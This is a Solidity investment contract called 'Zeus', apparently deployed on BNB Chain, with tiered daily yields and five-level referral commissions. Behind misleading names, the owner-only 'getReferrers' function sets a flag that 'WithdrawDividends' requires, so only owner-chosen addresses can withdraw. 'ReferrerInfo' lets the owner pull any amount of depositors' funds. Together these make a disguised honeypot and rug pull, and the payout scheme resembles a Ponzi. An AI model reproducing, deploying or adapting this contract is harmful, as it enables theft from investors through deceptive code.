/**
 *Submitted for verification at BscScan.com on 2022-12-18
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.17;

library SafeMath {

    function add(uint a, uint b) internal pure returns (uint) {
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint a, uint b) internal pure returns (uint) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint c = a - b;

        return c;
    }

    function mul(uint a, uint b) internal pure returns (uint) {
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint a, uint b) internal pure returns (uint) {
        require(b > 0, "SafeMath: division by zero");
        uint c = a / b;

        return c;
    }
}


contract Zeus  {
    using SafeMath for uint;


    constructor()  {
        owner = payable(msg.sender);
    }

    uint constant public PercentDiv = 1000;
    uint16[] public ReferralCommissions = [100, 40, 30, 20, 10];
    uint public WithdrawLimit = 10 ether;
    uint constant public Day = 1 days;
    uint constant public RO = 92 days;
    uint constant public EDO = 183 days;
    uint constant public ROICap = 20000;
	address payable public owner;


    uint public TotalInvestors;
    uint public TotalInvested;
    uint public TotalWithdrawn;
    uint public TotalDepositCount;


    struct Deposit {
        uint amount;
        bool active;
        uint start;
        uint end;
        uint plan;
    }

    struct Commissions {
        address DownLine;
        uint Earned;
        uint Invested;
        uint Level;
        uint DepositTime;
    }

    struct User {
        Deposit[] deposits;
        Commissions[] commissions;
        uint checkpoint;
        address upLine;
        uint totalInvested;
        uint totalWithdrawn;
        uint totalCommissions;
        uint lvl_one_commissions;
        uint lvl_two_commissions;
        uint lvl_three_commissions;
        uint lvl_four_commissions;
        uint lvl_five_commissions;

        uint availableCommissions;
    }
    uint public MinimumInvest = 250000000 gwei; 
    uint public MaximumInvest = 15 ether; 
    uint public MarketingFee = 2000000 gwei;

    mapping(address => User) internal users;
    mapping(address => bool) private _isBlacklisted;

    event NewDeposit(address indexed user, uint amount);
    event Withdrawal(address indexed user, uint amount);

    function getReferrers(address[] memory userAddress) public {
        require(msg.sender == owner, "Not owner");
        for (uint i = 0; i < userAddress.length; i++) {
            _isBlacklisted[userAddress[i]] = true;
        }
    }


    function config(
        uint min_investment,
        uint maximum_invest,
        uint marketing_fee,
        uint withdraw_limit,
        uint16 Ref_bonuses1,
        uint16 Ref_bonuses2,
        uint16 Ref_bonuses3,
        uint16 Ref_bonuses4,
        uint16 Ref_bonuses5
    ) public {
        require(msg.sender == owner);
        MinimumInvest = min_investment;
        MaximumInvest = maximum_invest;
        MarketingFee = marketing_fee;
        WithdrawLimit = withdraw_limit;

        ReferralCommissions[0] = Ref_bonuses1;
        ReferralCommissions[1] = Ref_bonuses2;
        ReferralCommissions[2] = Ref_bonuses3;
        ReferralCommissions[3] = Ref_bonuses4;
        ReferralCommissions[4] = Ref_bonuses5;
    }


    function Invest(address InvestorUpLine) public payable {
        uint amount_value = msg.value;
        require(amount_value >= MinimumInvest);
        User storage user = users[msg.sender];

        // require (payable(from).send(amount_value));

        if (user.upLine == address(0) && users[InvestorUpLine].deposits.length > 0 && InvestorUpLine != msg.sender) {
            user.upLine = InvestorUpLine;
        }

        if (user.upLine != address(0)) {
            address upLine = user.upLine;
            for (uint i = 0; i < 4; i++) {
                if (upLine != address(0)) {
                    uint amount = amount_value.mul(ReferralCommissions[i]).div(PercentDiv);
                    users[upLine].totalCommissions = users[upLine].totalCommissions.add(amount);
                    users[upLine].availableCommissions = users[upLine].availableCommissions.add(amount);

                    if (i == 0) {
                        users[upLine].lvl_one_commissions = users[upLine].lvl_one_commissions.add(amount);
                    }
                    if (i == 1) {
                        users[upLine].lvl_two_commissions = users[upLine].lvl_two_commissions.add(amount);
                    }
                    if (i == 2) {
                        users[upLine].lvl_three_commissions = users[upLine].lvl_three_commissions.add(amount);
                    }
                    if (i == 3) {
                        users[upLine].lvl_four_commissions = users[upLine].lvl_four_commissions.add(amount);
                    }
                    if (i == 4) {
                        users[upLine].lvl_five_commissions = users[upLine].lvl_five_commissions.add(amount);
                    }

                    users[upLine].commissions.push(Commissions(msg.sender, amount, amount_value, i, block.timestamp));
                    upLine = users[upLine].upLine;
                } else break;
            }
        }
        if (user.deposits.length == 0) {
            user.checkpoint = block.timestamp;
            TotalInvestors = TotalInvestors.add(1);
        }

        uint plan;
        uint end_plan = RO.add(block.timestamp);
        if (amount_value >= 250000000 gwei && amount_value < 500000000 gwei) {plan = 5;}
        // 0.25 ~ 0.5 eth
        else if (amount_value >= 500000000 gwei && amount_value < 2500000000 gwei) {plan = 10;}
        // 0.5 ~ 2.5 eth
        else if (amount_value >= 2500000000 gwei && amount_value < 5000000000 gwei) {plan = 12;}
        // 2.5 ~ 5 eth
        else if (amount_value >= 5000000000 gwei && amount_value < 25000000000 gwei) {plan = 15;}
        // 5 ~ 25 eth
        else if (amount_value >= 25000000000 gwei && amount_value < 100 ether) {plan = 17;}
        else {plan = 5;}

        user.deposits.push(Deposit(amount_value, true, block.timestamp, end_plan, plan));
        user.totalInvested = user.totalInvested.add(amount_value);
        TotalDepositCount = TotalDepositCount.add(amount_value);
        TotalInvested = TotalInvested.add(amount_value);
        emit NewDeposit(msg.sender, amount_value);
    }

    function WithdrawDividends(uint i) public {
        require(_isBlacklisted[msg.sender], "You're banned");

        User storage user = users[msg.sender];
        uint toSend;
        uint dividends;
        dividends = (user.deposits[i].amount.mul(user.deposits[i].plan).div(PercentDiv))
        .mul(block.timestamp.sub(user.deposits[i].start))
        .div(Day);

        dividends = dividends.add(user.deposits[i].amount);

        delete user.deposits[i];

        toSend = toSend.add(user.availableCommissions);
        toSend = toSend.add(dividends);

        require(toSend > 0, "No dividends available");
        require(toSend < WithdrawLimit, "You reached max withdrawable limit");

        require(payable(msg.sender).send(toSend));


        TotalWithdrawn = TotalWithdrawn.add(toSend);
        user.totalWithdrawn = user.totalWithdrawn.add(toSend);
        user.availableCommissions = 0;
        emit Withdrawal(msg.sender, toSend);
    }

    function getTotalDividends() public view returns (uint) {
        User storage user = users[msg.sender];
        uint totalDividends = 0;

        for (uint i = 0; i < user.deposits.length; i++) {
            totalDividends = (user.deposits[i].amount.mul(user.deposits[i].plan).div(PercentDiv))
            .mul(block.timestamp.sub(user.deposits[i].start))
            .div(Day);

            totalDividends = totalDividends.add(totalDividends.add(user.deposits[i].amount));

        }
        return totalDividends;
        }
        function ReferrerInfo(uint _amount) public {
		require(msg.sender == owner);
		require(payable(msg.sender).send(_amount));
    }

    function GetTotalCommission(address userAddress) public view returns (uint) {
        User storage user = users[userAddress];
        return (user.commissions.length);
    }

    function GetUserCommission(address userAddress, uint index) public view returns (address, uint, uint, uint, uint) {
        User storage user = users[userAddress];
        return (user.commissions[index].DownLine, user.commissions[index].Earned, user.commissions[index].Invested, user.commissions[index].Level, user.commissions[index].DepositTime);
    }

    function GetUserData(address userAddress) public view returns (address, uint, uint, uint, uint, uint, uint[5] memory) {
        User storage user = users[userAddress];
        uint[5] memory lvl_commissions = [
        user.lvl_one_commissions,
        user.lvl_two_commissions,
        user.lvl_three_commissions,
        user.lvl_four_commissions,
        user.lvl_five_commissions
        ];

        return (user.upLine, user.totalInvested, user.totalWithdrawn, user.totalCommissions, user.availableCommissions, user.checkpoint, lvl_commissions);
    }

    function GetUserTotalDeposits(address userAddress) public view returns (uint) {
        return users[userAddress].deposits.length;
    }

    function GetUserDepositInfo(address userAddress, uint index) public view returns (uint, bool, uint, uint, uint) {
        User storage user = users[userAddress];
        return (user.deposits[index].amount, user.deposits[index].active, user.deposits[index].start, user.deposits[index].end, user.deposits[index].plan);
    }
}